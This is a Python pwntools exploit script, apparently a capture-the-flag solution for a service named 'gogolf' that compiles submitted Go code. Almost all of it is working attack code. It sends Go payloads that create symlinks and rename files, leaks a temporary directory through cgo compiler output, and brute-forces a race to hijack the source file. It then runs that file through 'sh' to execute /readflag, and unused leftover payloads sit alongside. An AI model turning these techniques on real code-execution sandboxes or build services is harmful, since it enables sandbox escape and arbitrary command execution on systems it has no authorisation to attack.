#!/usr/bin/env python3

import re
import sys
import threading
from base64 import b64encode
from pwn import context, remote

context.log_level = "debug"

REMOTE = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("127.0.0.1", 31337)
SETTLE = 2.2
SPAN = 120

WARM = b'package main;import ."syscall";func main(){println(Getpid())}'

MK_S = b'package main;import ."os";func main(){Symlink("/dev/random","/tmp/s")}'
CK_S = b'package main;import ."os";func main(){_,e:=Readlink("/tmp/s");panic(e)}'

MK_P = b'package main;import ."os";func main(){panic(Symlink("/proc","/tmp/p"))}'
CK_P = b'package main;import ."os";func main(){_,e:=Readlink("/tmp/p");panic(e)}'

MK_X = b'package main;import ."os";func main(){Symlink("c/main.go","/tmp/x")}'
CK_X = b'package main;import ."os";func main(){_,e:=Readlink("/tmp/x");panic(e)}'

MK_I = b'package main;import ."os";func main(){Symlink("/go/bin/gcc","/go/i")}'
CK_I = b'package main;import ."os";func main(){_,e:=Readlink("/go/i");panic(e)}'

MK_R = b'package main;import ."os";func main(){Symlink("/readflag","/go/r")}'
CK_R = b'package main;import ."os";func main(){_,e:=Readlink("/go/r");panic(e)}'

RM_C = b'package main;import ."os";func main(){panic(Remove("/tmp/c"))}'

RENAME = b'package main;import ."os";func main(){Rename("t/gogolf-3483858396","x")}'

VICTIM = b'//bin/echo \\#!/go/r pls>/go/i\npackage main\n/*#include"../s"*/\nimport "C"'
TRIG = b'package main;import ."os/exec";func main(){Command("sh","/tmp/x").Run()}'
CHMOD = b'package main;import ."os";func main(){Chmod("/go/i",0755)}'
FINAL = b'package main\nimport "C"\nfunc main(){}'


def send(src: bytes, close = True) -> bytes | remote:
    print(f"\n\n[*] sending payload {src=} | {len(src)=} bytes")
    io = remote(*REMOTE)
    io.recvuntil(b"source code (b64):\n")
    io.recvline()
    io.sendline(b64encode(src))
    if close:
        out = io.recvall(timeout=6)
        io.close()
        return out
    return io

def symlink(src: str, dst: str) -> bytes:
    return f'package main;import."os";func main(){{Symlink("{src}","{dst}")}}'.encode()

def mv(src: str, dst: str) -> bytes:
    return f'package main;import."os";func main(){{Rename("{src}","{dst}")}}'.encode()

def exists(path: str) -> bytes:
      return f'package main;import."os";func main(){{_,e:=Stat("{path}");panic(e)}}'.encode()

def main() -> None:    
    send(symlink("/readflag", "r"))

    VICTIM = b"""//;r pls\npackage main\n//#cgo CFLAGS:-v\nimport "C"\nfunc main(){for{}}"""

    # brute until go generates a gogolf-<random> tmpdir with random part of 7 digits (~1/500 chance)
    planted = False
    runs = 0
    while not planted:
        runs += 1
        print(f"\n\n[*] run {runs}\n\n")
        r1 = remote(*REMOTE)
        r1.sendlineafter(b"source code (b64):\n", b64encode(VICTIM))
        leak = r1.recvline_regex(r"COLLECT_GCC_OPTIONS='-I' '.*'")
        tmp_path = re.search(rb"/tmp/gogolf-([a-z0-9]+)", leak).group(0).decode()
        print(f"\n\n{tmp_path=}, {len(tmp_path)=}\n\n")
        # keep open meanwhile

        send(symlink("/tmp", "t"))
        send(mv(f"t/{tmp_path.split('/')[-1]}", "/go/g"))
        res = send(exists("/go/g"))
        if not "/go/g: no such file or directory" in res.decode():
            print(f"\n\n[+] planted symlink at /go/g -> {tmp_path}\n\n")
            planted = True
        
        if (runs == 25): exit(1)
        r1.close()

    send(symlink(f"/go/g/main.go", "m"))
    ATTACKER = b"""package main;import ."os/exec";func main(){Command("sh","m").Run()}"""
    r2 = remote(*REMOTE)
    r2.sendlineafter(b"source code (b64):\n", b64encode(ATTACKER))
    r2.recvuntil(b"source code (b64):\n")
    print(r2.recvall(timeout=6))
    
    r1.close()
    r2.close()


"""
//;r pls
package main
//#cgo CFLAGS:-v
import "C"
func main(){for{}}
"""


if __name__ == "__main__":
    main()